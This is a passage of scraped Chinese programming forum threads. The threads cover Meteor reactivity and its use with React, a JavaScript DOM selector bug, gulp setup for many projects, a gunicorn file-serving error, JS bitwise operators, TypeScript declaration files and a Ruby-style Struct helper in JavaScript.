reactivity ，如果不需要的话。</p>\n\n<h4>Reactivity of Meteor</h4>\n\n<p>Meteor server 端没有 reactivity ，只有 client 端才有。</p>\n\n<p>Meteor 数据库和模板都能自动更新。可以使用 facebook 的 React 使前端组件化，代码会更好维护。可以把 Meteor 看做是 flux 的一种实现，类似 redux 之类的。 Meteor 也可以是 Facebook 新开源的 Relay 的一种实现。甚至某种程度上来说更完善。</p>\n\n<p>Reactivity 主要是基于观察者模式 (Observer Pattern)。可以避免过多地使用回调函数。</p>\n\n<h5>Computation</h5>\n\n<p>下面是 Meteor 里自带的具有 reactive computation 特性的函数:</p>\n\n<ul>\n<li>Templates</li>\n<li>Tracker.autorun</li>\n<li>Template.autorun</li>\n<li>Blaze.render Bleze 。 renderWithData</li>\n</ul>\n\n<p>不过如果使用 React 的话，那就是 &lt;code&gt;mixins: [ReactMeteorData]&lt;/code&gt; 这个 mixin 和<br>\n &lt;code&gt; getMeteorData()&lt;/code&gt; 函数一起使用。</p>\n\n<h5>变量</h5>\n\n<p>下面介绍几种 Meteor 常用的 reactive 变量。</p>\n\n<ul>\n<li><strong>MongoDB</strong></li>\n</ul>\n\n<p>Meteor 里用得最多的 reactive 变量来源当然是 Mongodb 的 collections 。</p>\n\n<ul>\n<li><strong>Session</strong> </li>\n</ul>\n\n<p>Session 是 Meteor 提供的一个只在前端使用的全局 reactive 数据源。<br>\n只要 Session.set 被调用并且改变了原值，那么对应的 Session.get 所在的模板或者 reactive 函数就会被自动重新运行。</p>\n\n<p>例如官方给的这个例子:</p>\n<div class=\"highlight\"><pre><span class=\"nx\">Tracker</span><span class=\"p\">.</span><span class=\"nx\">autorun</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">Meteor</span><span class=\"p\">.</span><span class=\"nx\">subscribe</span><span class=\"p\">(</span><span class=\"s2\">\"chat-history\"</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"nx\">room</span><span class=\"o\">:</span> <span class=\"nx\">Session</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"s2\">\"currentRoomId\"</span><span class=\"p\">)});</span>\n<span class=\"p\">});</span>\n\n<span class=\"c1\">// 下面这条语句会导致上面的 Tracker.autorun 函数再次被执行</span>\n<span class=\"c1\">// chat-history 的注册也转移到了 home</span>\n<span class=\"nx\">Session</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s2\">\"currentRoomId\"</span><span class=\"p\">,</span> <span class=\"s2\">\"home\"</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>注意 Session.get 和 Session.equals 的文档里有这句 \"..., invalidate the computation the next time the variable changes to or from the value.\", 这句话有点让人难以理解。它的意思是这两个 API 会使其所在的 reactive computation 失效，然后自动再运算。其实就是调用了 Session.set 且改变了原值之后，它所对应的 get 和 equals 所在的 reactive computation 函数会被重新运算一次。</p>\n\n<p>还有如果遇到以下情况:</p>\n<div class=\"highlight\"><pre><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"nx\">Session</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"s2\">\"key\"</span><span class=\"p\">)</span> <span class=\"o\">===</span> <span class=\"nx\">value</span>\n<span class=\"p\">(</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"nx\">Session</span><span class=\"p\">.</span><span class=\"nx\">equals</span><span class=\"p\">(</span><span class=\"s2\">\"key\"</span><span class=\"p\">,</span> <span class=\"nx\">value</span><span class=\"p\">)</span>\n</pre></div>\n\n<p>(2) 比 (1) 要好，可以避免不必要的重新渲染。细节见文档。</p>\n\n<p>但是如果要比较 object 和 array ，不能使用 Session.equals 。建议使用 underscore 的 <br>\n<code>_.isEqual(Session.get(key), value)</code>.</p>\n\n<p>另外如果使用 Session.get(), 它返回的是一个克隆值，所以改变返回值没有任何 reactive 效果。</p>\n\n<p>Session 因为是全局的，支持 hot code push 。但是不支持用户 refresh page ，如果 refresh ，值会回到初始值。</p>\n\n<ul>\n<li><strong>ReactiveVar/ReactiveDict</strong></li>\n</ul>\n\n<p>这两个未来会合并到后者 ReactiveDict 。主要是用于本地变量。</p>\n\n<ul>\n<li><strong>Meteor.status</strong></li>\n</ul>\n\n<p>不使用回调函数就可以实时获得客户端和服务器端连接的变化。</p>\n\n<ul>\n<li><strong>Meteor.user / Meteor.userId</strong></li>\n</ul>\n\n<p>如果没有登录的话，值为 null 。</p>\n\n<ul>\n<li><strong>Meteor.loggingIn</strong></li>\n</ul>\n\n<p>获得登录状态变化，用于显示登录动画。</p>\n\n<ul>\n<li><strong>The ready() method on a subscription handle</strong></li>\n</ul>\n\n<p>类似 subscription 的一个 callback 函数。在 ready() 里， Meteor 会自动处理 unsubscription 和回收 subscription 的 handle 。所以可以重复 subscribe 同一个数据源而不用自己 unsubscribe,  也避免了重复 subscribe 产生数据冲突。 Meteor 还能自动判断已被 unsubscribe 过的数据，如果再次 subscribe 就不会产生 client server 间的重复通信操作。</p>\n\n<h4>高级用法</h4>\n\n<p>你也可以使用 Deps 和 Tracker package 创建自己的 reactive 数据源和 computation 。不过这里就不介绍了。</p>\n\n<h4>Meteor 的坑:</h4>\n\n<ol>\n<li>目前 NPM 没有官方支持。不过第三方的支持也做得还不错。</li>\n<li>很多时候必须得按照 Meteor 的方式来编程。如果是老手可能会觉得 掣肘。但是反过来，我认为新手可以学到好的编程模式。</li>\n<li>大而全的框架更新慢，特别是在前端这个进化快速到几乎变态的环境下。很多新的东西出来不一定马上用得上，不过如果是真的有用，总会有第三方集成支持。</li>\n<li>数据库只能选 MongoDB 。不过有 PostgreSQL 的第三方支持。据说其他数据库支持快了。</li>\n<li>如果不读文档没有理解 Meteor 的机制会感觉黑魔法有点多。</li>\n</ol>\n</div></div>"], "reply": "5", "tittle": "Meteor 的响应式编程", "comment": ["看起来很黑科技，但是不建议用到生产", "这是翻译的么。 reactive programming 应该特指用 rx 的吧。不是用个观察者模式都能叫 reactive programming", " 部分原创，部分来自 Meteor 的文档，不过不是直接翻译，有经过整理。这个肯定是响应式编程。你说那个是微软的东西吧？", " \r", "\r", "\r", "\r", "用 Meteor 做的，应该是 slack 开源实现里最好的项目，我们团队也有基于 Meteor 的项目，生产环境中体验不错", " 谢谢分享。"]},
{"content": ["<div class=\"topic_content\">Uncaught TypeError: Cannot read property 'attributes' of undefined\r<br>Uncaught TypeError: Cannot read property 'nodeType' of undefined\r<br>\r<br>\r<br>\r<br>这是出问题代码片段\r<br>element = document.getElementsByTagName('*');\r<br>            var l = element.length;\r<br>            for (var j = 0; j &lt; l; j++) {\r<br>                if (element[j].attributes['class'] != undefined &amp;&amp; element[j].attributes['class'].value === 'github') {\r<br>                    element = element[j];\r<br>                }\r<br>            }\r<br>\r<br>\r<br>\r<br>\r<br>我在 console 里手工测试 document.getElementsByTagName('*')[key].attributes['class'] != undefined &amp;&amp; document.getElementsByTagName('*')[key].attributes['class'].value === 'github'   是没问题的\r<br>循环中会出现的元素我都在console手工测试过，所以元素明明都是可以使用attributes和nodeType的</div>"], "reply": "11", "tittle": "Chrome console 出现的 Uncaught TypeError: Cannot read property 'attributes' of undefined 应该怎么排查呢？", "comment": ["这个报错不是已经很明确了吗？你要找 xxx.attributes 和 ooo.nodeType ，但是 xxx 和 ooo 不存在。", "element = element[j]; \r", "\r", "说一下你想对 element 做什么奇怪的事情？", " 泥垢了😅  ", "^﹏^", "用原生的 DOM 写是有多累。", " 我觉得比带几百 K 的库好多了，楼主写法比较奇特...所以看着很累，让我写的话，", "document.get....(\"*\").forEach(func (){", "});", " 就是疑惑为什么会找不到呢   我在 chrome 控制台手工输入是可以找到的", " \r", " \r", " \r", "\r", "\r", "完整代码\r", "\r", "function $(selector) {\r", "    var str = selector.split(' '),\r", "        temp,\r", "        element = document;\r", "    for (var i = 0; i < str.length; i++) {//ID\r", "        if (str[i].indexOf('#') === 0) {\r", "            temp = str[i].replace('#', '');\r", "            element = element.getElementById(temp);\r", "        }\r", "        else if (str[i].indexOf('.') === 0) {//Class\r", "            temp = str[i].replace('.', '');\r", "            element = element.getElementsByClassName(temp)[0];\r", "        }\r", "        else if (str[i].indexOf('#') === -1 && str[i].indexOf('.') === -1 && str[i].indexOf('[') === -1) {//Tag\r", "            element = element.getElementsByTagName(str[i])[0];\r", "        }\r", "        else if (str[i].indexOf('[') === 0 && str[i].indexOf('=') === -1) {//属性\r", "            temp = str[i].replace('[', '').replace(']', '');\r", "            for (var element = element.getElementsByTagName('*'), j = 0; j < element.length; j++) {\r", "                if (element[j].hasAttribute(temp) === true) {\r", "                    element = element[j];\r", "                }\r", "            }\r", "        }\r", "        else {//属性值\r", "            temp = str[i].replace('[', '').replace(']', '');\r", "            temp = temp.split('=');\r", "            element = element.getElementsByTagName('*');\r", "            var l = element.length;\r", "            for (var j = 0; j < l; j++) {\r", "                if (element[j].attributes[temp[0]] != undefined && element[j].attributes[temp[0]].value === temp[1]) {\r", "                    element = element[j];\r", "                }\r", "            }\r", "        }\r", "    }\r", "    return element;\r", "}", "= = 打个断点就可以查看哪里不对啊。。这样的代码格式，谁愿意看。。", " 回复不能用 Markdown", "可以 gist 贴代码\r", "逐步 console.log 出来即可", " \r", " \r", " \r", " \r", "\r", "\r", "JS CODE\r", "\r", "\r", "HTML CODE\r", "\r", "\r", "在 chrome console 输入 $(\"[class=baidu]\")  就会出现错误", "  = = 运行了下，没报错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Meteor 和 React 非常适合联合使用。两者的一个匹配特点就是数据的自动响应 - Reactivity 。这种 <a target=\"_blank\" rel=\"nofollow\" href=\"http://jinglei.me/meteor-li-de-reactive-bian-liang/\">响应式编程</a> 避免了使用者再写代码来跟踪变量更新的情形，所以代码会更加简洁易维护。</p>\n\n<p>下面简单对比一下 Meteor 与其他框架或者架构。</p>\n\n<h3>REST</h3>\n\n<p>不同于大多数传统架构， Meteor 没有采用 RESTful 的后端。 Meteor 的客户端和服务器之间的数据交流是基于 Publish-subscribe 模式。 REST API 挺消耗资源的，特别是在移动应用盛行的时代，客户端需要更频繁的存取数据，所以现在一个趋势是用 Restless 架构，例如使用 WebSocket 。不过 REST 、 SOAP 和 WebSocket 都有各自的应用场景。</p>\n\n<p>Meteor 采用自己开发的一套基于 WebSocket 的简单协议 - DDP 。基本上就是利用 WebSocket 传递 JSON 消息。 DDP 有各种主流平台、语言的实现。<a target=\"_blank\" rel=\"nofollow\" href=\"http://meteorpedia.com/read/DDP_Clients\">支持列表见这里</a>。所以也可以把 Meteor 仅仅当做后端服务来使用。</p>\n\n<p>Meteor 就是基于以上描述的一个实时框架。所以能够做到以下三个特点:</p>\n\n<ul>\n<li><p><strong><em>Database Everywhere</em></strong>   前后端都可以直接操作数据库里的数据</p></li>\n<li><p><strong><em>Latency Compensation</em></strong>  就是 Relay 的 Optimistic Update</p></li>\n<li><p><strong><em>Full Stack Reactivity</em></strong>. 从数据库到模板，所有层面实时响应、自动更新</p></li>\n</ul>\n\n<h3>Flux</h3>\n\n<p>Flux 的核心概念是单向数据流，利用观察者模式保证数据源只来自于一个地方。</p>\n\n<p><img src=\"https://facebook.github.io/flux/img/flux-simple-f8-diagram-with-client-action-1300w.png\" alt=\"image\"></p>\n\n<p>如上图。 Flux 主要由三部分: Dispatcher, Store 和 View (React Components) 组成。</p>\n\n<p>Action (或者叫 Action Creator) 是 Dispatcher 的辅助函数，主要是用来描述由 View 产生的用户互动或者其他触发事件。 Action Creator 会打包用户互动来生成对象，可以看做是 Flux 的第四部分。</p>\n\n<p>Dispatcher 类似一个中央集线器，由一堆 Store 的回调函数组成。</p>\n\n<p>Store 负责保存应用的状态和逻辑，在其外部的代码是不涉及数据管理的；它自己也不产生数据，只能从外部获得新数据。 Store 对 Action 进行反馈，然后发出一个数据状态改变的事件。 Controller-View 监听事件，一旦触发就从 Store 获取相应数据。这样就能够保证数据的单向流动，使逻辑更简单。</p>\n\n<p>Meteor 完全可以作为一种 Flux 的实现。例如使用 FlowRouter 作为 Dispatcher ， MiniMongo 作为 Store 。这样可以为 React 带来很好的数据和逻辑状态的管理；反过来， React 也可以为 Meteor 带来前端模块化，单向数据流模式，使代码更少且更好维护；另外 React 的 Virtual Dom 机制也为会 Meteor 前端渲染带来性能上的提高。所以我说他们是 Naturally Fit 。</p>\n\n<p><img src=\"http://7xnfkz.com1.z0.glb.clouddn.com/react.png\" alt=\"meteoreact\"></p>\n\n<p>上图就是一个典型的 React Meteor App 。个人感觉好像 Flux 更多是面向 Chat Based App ，所以没有涉及到 routing 。在 Meteor ，很多时候 Router 其实是一个天然的 Dispatcher 。而 Meteor 客户端自带的 MiniMongo 可以作为 Store 。对于 View ，如图中可以使用一个父组件来监听数据的变化，子组件负责界面渲染和互动。另外一个方案是使用高阶组件 (Higher Order Components) HOC 来包裹 UI 组件。高阶组件负责数据查询，子组件负责渲染等。在简单情况下，单个组件就可以了， Controller-View 可以和 UI 渲染在一个 Component 里。如果程序复杂，也可以使用 Meteor 的 Tracker.autorun 来建立一个独立的 Store 。已经有人按照 Flux 的方式把 Facebook 的 Dispatcher 再包装为这个 Meteor 包 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/worona/meteorflux/\">Github Repo</a>。不过我认为这样做反而把简单问题复杂化了。也或许我遇到的问题还不够复杂。</p>\n\n<h3>Relay and GraphQL</h3>\n\n<p>Meteor 还没有类似 GraphQL 的包。不过据说正在开发类似的东西，甚至兼容 SQL 数据库。现在 Meteor 官方只支持 MongoDB 。</p>\n\n<p>对于 Relay ，其实 Meteor 的 Meteor.subscribe 和 MiniMongo 做着类似的事情。下面对比 Meteor 和 Relay 的三个特点</p>\n\n<ul>\n<li><p><strong>Declarative</strong> &lt;br/&gt;<br>\nRelay 不使用命令式的 API 来进行数据通信，而使用 GraphQL 申明数据需求，自动获取数据。<br>\n在 Meteor ，如果使用 ReactMeteorData Mixin ，可以获得同样的效果。 getMeteorData 是一个 reactive computation ，所以每次具有响应性的数据变化后，这个函数会被自动调用，再次获得数据。详情参见 <a target=\"_blank\" rel=\"nofollow\" href=\"https://react-in-meteor.readthedocs.org/en/latest/\">这里</a>。</p></li>\n<li><p><strong>Colocation</strong> &lt;br/&gt;<br>\n数据查询和 View 在一起，这样更容易理解和调试程序。 Relay 还能聚集查询来提高请求数据的效率。对于 Meteor ，前面提到的 ReactMeteorData Mixin 本来就是在 React 的 Component 里，所以也具有 Relay 的托管特点。</p></li>\n<li><p><strong>Mutations</strong> &lt;br/&gt;<br>\nRelay 允许通过 GraphQL 在客户端和服务器端修改数据，并且自动做到数据的一致性，乐观更新 (Optimistic Update)。 Meteor 的 MiniMongo 也具有这些特征。前面在 REST 部分提到的 Meteor 三个特点， Database Everywhere 和 Full Stack Reactivity 就是指在前后端存取数据，自动保持数据的一致性；而 Latency Compensation 其实就是 Optimistic Update 。另外从 <a target=\"_blank\" rel=\"nofollow\" href=\"https://kadira.io/blog/graphql/initial-impression-on-relay-and-graphql\">这篇文章</a> 看起来， Relay 在数据的 Reactive 方面做得还不够，前后端都还要写一些数据的更新逻辑，甚至得通过 polling 来达到数据的实时更新。</p></li>\n</ul>\n\n<h3>小结</h3>\n\n<p>随着 Relay 和 GraphQL 的发布，感觉 Facebook 正在开发和 Meteor 同类型的前后端完整框架，而不是仅仅局限于前端 View 。</p>\n\n<p>其实 Facebook 没有发明任何新概念，只是把很多传统的软件开发实践用到了前端领域。随着移动应用的广泛传播和前端开发的复杂化， React 生逢其时，把前端工程化向前推了一步。</p>\n\n<p><em>Disclaimer: 对于 Relay 我没有实际经验，都是通过 Facebook 的文档来了解，如果理解有偏差，欢迎纠正讨论。</em></p>\n</div></div>"], "reply": "2", "tittle": "使用 Meteor 和 React 开发 Web App", "comment": ["你用的是 meteor-react 吗？上次更新是 6 个月前。。。", " \r", "用这个\r", "\r", "10 月 31 号最后更新的\r", "meteor add react"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>问题：</strong>gulp 如何管理多项目？</p>\n\n<p>一般采用 gulp ，需将依赖的<code>node_modules</code>（插件集） down 于本地；而我们团队所做的项目多而且小，彼此间又比较独立。如果每个小项目下都对应一个<code>node_modules</code>，很是有些不妥。目前在尝试期: 是把<code>node_modules</code>以及<code>gulpfile.js</code>放在了众小项目之外，每次需要对某个小项目更改，改动<code>gulpfile.js</code>中路径配置，很是不够便捷。</p>\n\n<p><strong>探究</strong>：有尝试些许办法，比如采用<code>npm link</code>,将需要的插件集合全局下载，让单独小项目 link 于全局插件。但是用 gulp-watch 在 win 下出现如下问题(mac 下还未尝试)：<br>\n<code><br>\n[10:43:25] 'watch' errored after 7.4 s<br>\n[10:43:25] Error: EPERM: operation not permitted, scandir 'E:\\$RECYCLE.BIN\\S-1-5-21-422716981-4093441979-2207027076-1001'<br>\n    at Error (native)<br>\n    at Object.fs.readdirSync (fs.js:813:18)<br>\n    at Glob._readdir (E:\\1021_gulp_test\\ddzmod\\ddztemplate\\node_modules\\gulp\\node_modules\\vinyl-fs\\node_modules\\glob-watcher\\node_modules\\gaze\\node_modules\\globule\\node_modules\\glob\\glob.js:577:20)<br>\n</code></p>\n\n<p>即便不出问题，每个小项目之下有对于本机插件依赖的<code>node_modules</code>，对于团队开发，也不怎么妥当。</p>\n\n<p><strong>请教：</strong> 故而，在此求教 gulp 如何管理多项目方法，新人初来乍到，愿指点一二，拜谢。</p>\n</div></div>"], "reply": "14", "tittle": "gulp 如何管理多项目？", "comment": ["我们都是每个项目一套 package.json 和 gulpfile.js", "小项目需要用 gulp 么？如果是简单的浏览器编辑器同步 watch 的话，命令行一行搞定啊\r", "browser-sync start --server --files=\"*.html,css/*.css,*.css\" --browser=\"google chrome\" --open=\"external\"\r", "\r", "如果 Node 项目（当然你没发在 Node 板块）的话，那就要像一楼朋友说的一样，需要单独的 Git 仓库和 package 啊", "喔，感谢；我们的每个单独项目过于小，而且繁多。如果每个项目下都放一个， SVN 不上传吧，用的时候都得 install 插件； SVN 上传，这个占用空间感觉耗不起；素以，只好另想想办法了。", "SVN 设置忽略 node_modules 目录，只扔 package.json 即可", " 项目虽小，也想借助工具来对代码进行检测 /压缩 /美化 /合并 /监测代码 /转化模版等等；而 gulp 无疑是一个不错的选择，素以才...。", "使用 gulp --cwd .    然后做成一个命令行", "我觉得每次 install 其实还能接受，除非你们的 module 很多很多", " 暂时也没有很多， 8 ， 9 个的样子；但，感觉蛮多的东西要慢慢引入的，比如 Sass 等，所以就必须学习下这块了，若能做到简洁一丢丢，对使用体验来讲就“开心”很多嘛。", " 感谢。这个方向有必要尝试一下耶。", " repo 你只要上传 package.json 和 gulpfile.js 即可， node_modules 放 ignore 。\r", "部署的时候直接在服务器端跑一次 npm install 和 gulp 。", "在 segmentFault 有一篇文章［ nodejs 中的 NODE_PATH ，地址： ", " ；谈及到用 NODE_PATH （ NODE 中用来寻找模块所提供的路径注册环境变量）来解决；但是也有其弊端，还未采用。", " 感谢。办法觉得挺好，可以一试；若服务器环境有“内网测试”，“正式”等，同步起来好像要费点力气折腾下。", " 如果一个服务器部署同一个 app 的不同的 staging ，可以考虑 capistrano", " thx 。 capistrano 目测很厉害的样子，可惜目前还不会用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好奇怪的问题，这个 js 文件只加载了一部分，直接拖到最后可以看到是一个不完整的 js 文件<br>\n地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://app-video-test.biquu.com/static/gen/admin.js\">http://app-video-test.biquu.com/static/gen/admin.js</a></p>\n</div></div>"], "reply": "3", "tittle": "js 文件只加载了一部分", "comment": ["<html>\r", "  <head>\r", "    <title>Internal Server Error</title>\r", "  </head>\r", "  <body>\r", "    <h1>Internal Server Error</h1>\r", "    \r", "  </body>\r", "</html>", "自己去查", "问题解决了，访问这个链接时，查看了 gunicorn 的运行日志，出现了这样的错误信息：\r", "---------------------------------------\r", "Traceback (most recent call last):\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/workers/sync.py\", line 108, in handle_request\r", "    resp.write_file(respiter)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/wsgi.py\", line 333, in write_file\r", "    self.sendfile_all(fileno, self.sock.fileno(), fo_offset, nbytes)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/wsgi.py\", line 310, in sendfile_all\r", "    sent += sendfile(sockno, fileno, offset+sent, nbytes-sent)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/_sendfile.py\", line 66, in sendfile\r", "    raise OSError(e, os.strerror(e))\r", "OSError: [Errno 11] Resource temporarily unavailable\r", "ERROR:gunicorn.error:Error handling request\r", "Traceback (most recent call last):\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/workers/sync.py\", line 108, in handle_request\r", "    resp.write_file(respiter)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/wsgi.py\", line 333, in write_file\r", "    self.sendfile_all(fileno, self.sock.fileno(), fo_offset, nbytes)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/wsgi.py\", line 310, in sendfile_all\r", "    sent += sendfile(sockno, fileno, offset+sent, nbytes-sent)\r", "  File \"/home/run_user/.virtualenvs/product/local/lib/python2.7/site-packages/gunicorn/http/_sendfile.py\", line 66, in sendfile\r", "    raise OSError(e, os.strerror(e))\r", "OSError: [Errno 11] Resource temporarily unavailable\r", "\r", "---------------------------------------\r", "\r", "把 gunicorn 版本升级到 19.3.0 就解决了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;code&gt;return (num &lt;&lt; cnt) | (num &gt;&gt;&gt; (32 - cnt));&lt;/code&gt;<br>\n改成 python 怎么改<br>\n就是说 (x)|(y)是什么意思呢<br>\n无符号位移（&gt;&gt;&gt;）和有符号位移（&gt;&gt;）在 javascript 有区别， python 如何做</p>\n</div></div>"], "reply": "4", "tittle": "javascript 的一点语法问题", "comment": ["code 怎么弄额", "```js\r", "\r", "  // code\r", "  function test () {}\r", "\r", "```", "|就是按位或啊  比如 3 的二进制是 011 5 的二进制是 101  3|5 结果是 111 ，也就是 7.python 也有|", " 谢谢，还有一个：无符号位移（>>>）和有符号位移（>>）在 javascript 好像有不小的区别，请问在 python 如何做呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了官方的<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.typescriptlang.org/Handbook#writing-dts-files\">handbook</a>不太懂这个.d.ts 文件到底有何用处</p>\n\n<p>之所提这个问题，是因为用 npm 安装的<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/basarat/typescript-collections\">type-script</a> 没有办法 import 而我自己试过单独把 collections.js 和 collections.d.ts 提取出来仍然没办法 import 不知道.d.ts 文件到底是什么含义</p>\n</div></div>"], "reply": "5", "tittle": "typescript 的 .d.ts 文件如何 Import", "comment": ["*.d.ts 是为第三方 javascript module 提供一个让代码编辑软件和 typescript 编译器可以理解的 interface 。\r", "\r", "一般的使用法是在文件中加入如下注释即可，不需要 import 。\r", "/// <reference path=\"./collections.d.ts\" />\r", "\r", "最新的 vscode 和 atom-typescript 也支持直接在 jsconfig.json/tsconfig.json 配置里的 \"files\" 定义中引用 .d.ts 文件，而不再需要在每个文件中写这种重复的 comment 。参见 ", " 那具体的 ts 或者 js 的实现文件应该放在哪里？放在 d.ts 文件同一个目录下面吗？\r", "按照你的做法确实成功了。但是为什么只需要 reference d.ts 文件就可以，而不需要 import 真正实现的 ts 或者 js 文件呢？", "external js + *. d.ts :\r", "把 js 文件單獨添加到 index.html <script>裏就行。\r", "參見 ", "\r", "\r", "\r", "*.ts :\r", "collections.ts 定義的是一個 typescript internal module ，直接引用時不需要 import 。\r", "或者使用 import myset = collections.Set; 形式。\r", "參見 ", " 我写的不是网页，而是 nodejs 那是不是把 collections.ts 放在 collections.d.ts 同一目录下就可以了，而不用去 require", " 如果你使用 collections.ts 的話，就不需要 collections.d.ts 了。我沒用 typescript 做過 node.js 項目，你自己摸索試試。我猜是不需要 require 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有实现方法么</p>\n</div></div>"], "reply": "2", "tittle": "js 可以实现添加 m 站到手机桌面么？", "comment": ["不能。寄宿关系：客户端 js<浏览器<手机系统。\r", "你可能见过超级 APP 对该需求的实现，但那不是 js 的功劳。", "这里有一个 demo ，参考 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看完了计算的本质，准备把所有代码用 JS 实现一边。而且保证尽量和书上的 Ruby 代码长得一样……于是就不得不造了一堆轮子……<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/simple/tree/master/src\">https://github.com/bramblex/simple/tree/master/src</a></p>\n\n<p>看看都有什么……<br>\nUtils:<br>\n.indent(n, block [, indent_char]) 用来一个整个字符串块进行缩进的<br>\n.indent.skipFirstLine() 跳过第一行，然后缩进后面的行<br>\n.attrs(obj) 遍历一个 object ，并且将他的属性名，并且根据 self 和 proto 分类。<br>\n.slice(obj) 将一个对象切片成 [key, value] 的数组。<br>\n.sliceStr(string) 将一个字符串切成字符数组<br>\n.render(template_string, obj) 模板字符串。示例 render('My name is &lt;%name%&gt;!', {name: 'Tom'}) =&gt; 'My name is Tom!'<br>\n.inspect(something) 和 node 里面的 util.inspect 类似……这里我写出来只是为了不依赖 node 。<br>\n.color(c, str) 把一个字符串加上颜色（只在终端里有效）<br>\n.surround(pair, string) 给字符串加上括号之类的。<br>\n.merge(target, obj) 将两个对象混合，并返回一个新对象。<br>\n.kv(key, value) 返回一个只带有此键值对的对象。<br>\n.importScope(scope_name) 生成一段代码，把某个对象的所有属性导入当前作用域。和 eval 一起用<br>\n.equal(a, b) 比较 a 和 b 是否相同。如果 a, b 中带有 equal 方法则用 a 的 equal 比较 b 。会递归比较数组。</p>\n\n<p>Struct 类……和 Ruby 的 Struct 类一样<br>\n比如 Ruby 中的</p>\n<div class=\"highlight\"><pre><span class=\"k\">class</span> <span class=\"nc\">A</span> <span class=\"o\">&lt;</span> <span class=\"no\">Struct</span><span class=\"o\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"ss\">:a</span><span class=\"p\">,</span> <span class=\"ss\">:b</span><span class=\"p\">)</span>\n<span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span>\n<span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span>\n<span class=\"nb\">puts</span> <span class=\"n\">a</span> <span class=\"c1\"># =&gt; #&lt;Struct A a=1, b=2&gt;</span>\n<span class=\"n\">a</span> <span class=\"o\">==</span> <span class=\"n\">b</span> <span class=\"c1\">#=&gt; true</span>\n</pre></div>\n\n<p>可以这样写</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">A</span> <span class=\"o\">=</span> <span class=\"nx\">Struct</span><span class=\"p\">(</span><span class=\"s1\">'A'</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"s1\">'a'</span><span class=\"p\">,</span> <span class=\"s1\">'b'</span><span class=\"p\">])</span>\n<span class=\"kd\">var</span> <span class=\"nx\">B</span> <span class=\"o\">=</span> <span class=\"nx\">Struct</span><span class=\"p\">(</span><span class=\"s1\">'B'</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"nx\">a</span><span class=\"o\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"o\">:</span><span class=\"mi\">0</span><span class=\"p\">})</span>\n<span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span>\n<span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"nx\">A</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span>\n<span class=\"kd\">var</span> <span class=\"nx\">c</span> <span class=\"o\">=</span> <span class=\"nx\">B</span><span class=\"p\">()</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; #&lt;Struct a=1, b=2&gt;</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">c</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; #&lt;Struct a=0, b=0&gt;</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">equal</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">A</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">],</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">]).</span><span class=\"nx\">equal</span><span 